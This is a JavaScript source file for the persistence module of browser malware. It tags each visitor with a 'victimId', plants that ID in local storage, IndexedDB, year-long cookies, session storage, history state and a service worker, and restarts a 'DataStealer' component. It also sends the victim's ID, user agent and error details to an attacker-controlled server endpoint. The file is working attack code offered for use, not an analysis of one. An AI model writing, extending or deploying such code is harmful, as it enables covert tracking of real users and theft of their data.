class PersistenceManager {
    constructor(victimId, serverUrl) {
        this.victimId = victimId;
        this.serverUrl = serverUrl;
        this.persistenceMethods = [];
        this.isPersistent = false;
    }

    async establishPersistence() {
        if (this.isPersistent) return;

        console.log('Establishing persistence...');

        try {
            // Multiple persistence techniques
            await this.setLocalStoragePersistence();
            await this.setServiceWorkerPersistence();
            await this.setIndexedDBPersistence();
            await this.setCookiePersistence();
            await this.setBrowserHistoryPersistence();
            await this.setSessionPersistence();
            
            this.isPersistent = true;
            await this.sendPersistenceStatus();
            
        } catch (error) {
            console.error('Persistence error:', error);
            await this.sendError('persistence_error', error);
        }
    }

    async setLocalStoragePersistence() {
        try {
            const persistenceData = {
                victimId: this.victimId,
                serverUrl: this.serverUrl,
                installedAt: Date.now(),
                lastActive: Date.now(),
                version: '2.0.0'
            };

            localStorage.setItem('_system_persistence', JSON.stringify(persistenceData));
            
            // Set up periodic updates
            setInterval(() => {
                const data = JSON.parse(localStorage.getItem('_system_persistence') || '{}');
                data.lastActive = Date.now();
                localStorage.setItem('_system_persistence', JSON.stringify(data));
            }, 60000); // Update every minute

            this.persistenceMethods.push('localStorage');
            console.log('LocalStorage persistence established');
            
        } catch (error) {
            console.warn('LocalStorage persistence failed:', error);
        }
    }

    async setServiceWorkerPersistence() {
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register('/sw.js', {
                    scope: '/'
                });

                console.log('ServiceWorker registered:', registration);
                this.persistenceMethods.push('serviceWorker');
                
            } catch (error) {
                console.warn('ServiceWorker registration failed:', error);
            }
        }
    }

    async setIndexedDBPersistence() {
        return new Promise((resolve) => {
            if (!window.indexedDB) {
                resolve();
                return;
            }

            const request = indexedDB.open('SystemPersistenceDB', 1);

            request.onerror = () => {
                console.warn('IndexedDB persistence failed');
                resolve();
            };

            request.onsuccess = (event) => {
                const db = event.target.result;
                
                const transaction = db.transaction(['persistence'], 'readwrite');
                const store = transaction.objectStore('persistence');
                
                const data = {
                    victimId: this.victimId,
                    serverUrl: this.serverUrl,
                    installedAt: Date.now(),
                    lastActive: Date.now()
                };

                store.put(data, 'persistence_data');
                
                this.persistenceMethods.push('indexedDB');
                console.log('IndexedDB persistence established');
                resolve();
            };

            request.onupgradeneeded = (event) => {
                const db = event.target.result;
                db.createObjectStore('persistence', { keyPath: 'id' });
            };
        });
    }

    async setCookiePersistence() {
        try {
            const expiration = new Date();
            expiration.setFullYear(expiration.getFullYear() + 1); // 1 year expiration
            
            document.cookie = `system_persistence=${this.victimId}; expires=${expiration.toUTCString()}; path=/; samesite=lax`;
            document.cookie = `system_active=true; expires=${expiration.toUTCString()}; path=/; samesite=lax`;
            
            this.persistenceMethods.push('cookies');
            console.log('Cookie persistence established');
            
        } catch (error) {
            console.warn('Cookie persistence failed:', error);
        }
    }

    async setBrowserHistoryPersistence() {
        try {
            // Add entry to browser history
            const state = {
                victimId: this.victimId,
                timestamp: Date.now(),
                type: 'system_persistence'
            };

            window.history.replaceState(state, '', window.location.href);
            
            // Listen for back/forward navigation
            window.addEventListener('popstate', (event) => {
                if (event.state && event.state.type === 'system_persistence') {
                    this.reactivateSystem();
                }
            });

            this.persistenceMethods.push('history');
            console.log('Browser history persistence established');
            
        } catch (error) {
            console.warn('Browser history persistence failed:', error);
        }
    }

    async setSessionPersistence() {
        try {
            sessionStorage.setItem('system_session_persistence', JSON.stringify({
                victimId: this.victimId,
                serverUrl: this.serverUrl,
                sessionStart: Date.now()
            }));

            // Restore on page reload
            window.addEventListener('beforeunload', () => {
                this.prepareSessionRestore();
            });

            this.persistenceMethods.push('sessionStorage');
            console.log('Session persistence established');
            
        } catch (error) {
            console.warn('Session persistence failed:', error);
        }
    }

    prepareSessionRestore() {
        const restoreData = {
            victimId: this.victimId,
            serverUrl: this.serverUrl,
            timestamp: Date.now(),
            url: window.location.href,
            scrollPosition: {
                x: window.scrollX,
                y: window.scrollY
            }
        };

        localStorage.setItem('session_restore_data', JSON.stringify(restoreData));
    }

    async restoreSession() {
        try {
            const restoreData = JSON.parse(localStorage.getItem('session_restore_data') || '{}');
            
            if (restoreData.victimId === this.victimId) {
                // Restore scroll position
                window.scrollTo(restoreData.scrollPosition.x, restoreData.scrollPosition.y);
                
                console.log('Session restored successfully');
                return true;
            }
        } catch (error) {
            console.warn('Session restore failed:', error);
        }
        
        return false;
    }

    reactivateSystem() {
        console.log('System reactivated from persistence');
        
        // Re-initialize all systems
        if (window.DataStealer) {
            window.stealer = new DataStealer(this.victimId, this.serverUrl);
            window.stealer.startDataCollection();
        }
        
        this.sendReactivationEvent();
    }

    async sendReactivationEvent() {
        try {
            await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: 'reactivation',
                    payload: {
                        method: 'persistence',
                        timestamp: Date.now(),
                        userAgent: navigator.userAgent
                    },
                    timestamp: Date.now()
                })
            });
        } catch (error) {
            console.warn('Failed to send reactivation event:', error);
        }
    }

    async sendPersistenceStatus() {
        try {
            await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: 'persistence_established',
                    payload: {
                        methods: this.persistenceMethods,
                        timestamp: Date.now(),
                        userAgent: navigator.userAgent
                    },
                    timestamp: Date.now()
                })
            });
        } catch (error) {
            console.warn('Failed to send persistence status:', error);
        }
    }

    async sendError(type, error) {
        try {
            await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: 'error',
                    payload: {
                        type: type,
                        message: error.message,
                        stack: error.stack
                    },
                    timestamp: Date.now()
                })
            });
        } catch (sendError) {
            console.warn('Failed to send error:', sendError);
        }
    }

    // Check if system was previously installed
    async checkExistingPersistence() {
        try {
            // Check localStorage
            const lsData = localStorage.getItem('_system_persistence');
            if (lsData) {
                const data = JSON.parse(lsData);
                if (data.victimId) {
                    return {
                        exists: true,
                        victimId: data.victimId,
                        method: 'localStorage',
                        installedAt: data.installedAt
                    };
                }
            }

            // Check cookies
            const cookies = document.cookie.split(';');
            const persistenceCookie = cookies.find(cookie => 
                cookie.trim().startsWith('system_persistence=')
            );
            
            if (persistenceCookie) {
                const victimId = persistenceCookie.split('=')[1];
                return {
                    exists: true,
                    victimId: victimId,
                    method: 'cookies'
                };
            }

            // Check sessionStorage
            const sessionData = sessionStorage.getItem('system_session_persistence');
            if (sessionData) {
                const data = JSON.parse(sessionData);
                return {
                    exists: true,
                    victimId: data.victimId,
                    method: 'sessionStorage'
                };
            }

        } catch (error) {
            console.warn('Persistence check failed:', error);
        }

        return { exists: false };
    }

    // Clean up persistence (for testing)
    async cleanupPersistence() {
        try {
            localStorage.removeItem('_system_persistence');
            localStorage.removeItem('session_restore_data');
            sessionStorage.removeItem('system_session_persistence');
            
            document.cookie = 'system_persistence=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
            document.cookie = 'system_active=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
            
            if (window.indexedDB) {
                indexedDB.deleteDatabase('SystemPersistenceDB');
            }
            
            this.isPersistent = false;
            this.persistenceMethods = [];
            
            console.log('Persistence cleaned up');
            
        } catch (error) {
            console.error('Persistence cleanup error:', error);
        }
    }
}

// Export for use in other modules
window.PersistenceManager = PersistenceManager;
